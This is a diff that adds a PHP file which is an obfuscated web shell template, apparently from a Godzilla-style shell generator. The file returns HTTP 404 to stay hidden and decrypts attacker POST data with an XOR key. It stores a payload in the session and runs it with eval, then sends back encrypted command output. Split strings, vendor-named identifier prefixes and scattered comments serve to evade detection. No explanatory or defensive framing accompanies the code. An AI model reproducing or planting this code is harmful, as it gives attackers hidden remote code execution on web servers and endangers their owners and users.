@@ -1,0 +1,36 @@
+<?pHP
+http_response_code(404);
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*dbappsecurityCh3yaQPIpr*/(Chr("48"));
+function qianxingCgkD21wHn(/*dbappsecurityN05i2v*/$qianxinfImnkp0WMq6TX,$qianxinGYCCVkSDkVAY){
+    for($qianxinhP=Chr("48");$qianxinhP<strlen($qianxinfImnkp0WMq6TX);$qianxinhP++) {
+        $qianxinqq = $qianxinGYCCVkSDkVAY[$qianxinhP+Chr("49")&15];
+        $qianxinfImnkp0WMq6TX[$qianxinhP] = $qianxinfImnkp0WMq6TX[$qianxinhP]^$qianxinqq;
+    }
+    return $qianxinfImnkp0WMq6TX;
+}
+$qianxinITUfjjXmxo2 = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_qianxingCgkD21wHn = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$qianxinw7hJzkKxyi='{pass}';
+$qianxinuMq5P9IAtT1AwU='p'.$qianxinITUfjjXmxo2($qianxinITUfjjXmxo2("WVhsc2IyRms="));
+$qianxin1B='{secretKey}';
+if (isset($_POST/*dbappsecurityQikjH7TyvFiC5K*/[$qianxinw7hJzkKxyi])){
+    $datqianxin7mlwRjVMRy1A=qianxingCgkD21wHn/*dbappsecurityKdu4owvmY*/($qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi]),$qianxin1B);
+    if (/*dbappsecuritybmIrEvG*/isset($_SESSION/*dbappsecurityJrZYGpRm*/[$qianxinuMq5P9IAtT1AwU])){
+        $qianxinqN=qianxingCgkD21wHn($_SESSION/*dbappsecurityqdVXl3Fu4*/[$qianxinuMq5P9IAtT1AwU],$qianxin1B);
+        if (/*dbappsecurityZIDeNEw*/strpos($qianxinqN,$qianxinITUfjjXmxo2/*dbappsecuritySC9ERptWGKU*/($qianxinITUfjjXmxo2("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $qianxinqN=qianxingCgkD21wHn/*dbappsecurityt9vgwbR6Nu*/($qianxinqN,$qianxin1B);
+        }
+                define("qianxinhRs0Ff","//qianxinUJEoZGk\r\n".$qianxinqN);
+                eval(qianxinhRs0Ff);
+                                echo "{\"message\":\"";
+                        echo $base64_qianxingCgkD21wHn(qianxingCgkD21wHn(@run($datqianxin7mlwRjVMRy1A),$qianxin1B));
+                                echo "\"}";
+    }else{
+        if (strpos/*dbappsecurityGS4ujb8wCNv1LjR*/($datqianxin7mlwRjVMRy1A,$qianxinITUfjjXmxo2($qianxinITUfjjXmxo2("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$qianxinuMq5P9IAtT1AwU]=qianxingCgkD21wHn($datqianxin7mlwRjVMRy1A,$qianxin1B);
+        }
+    }
+}
+
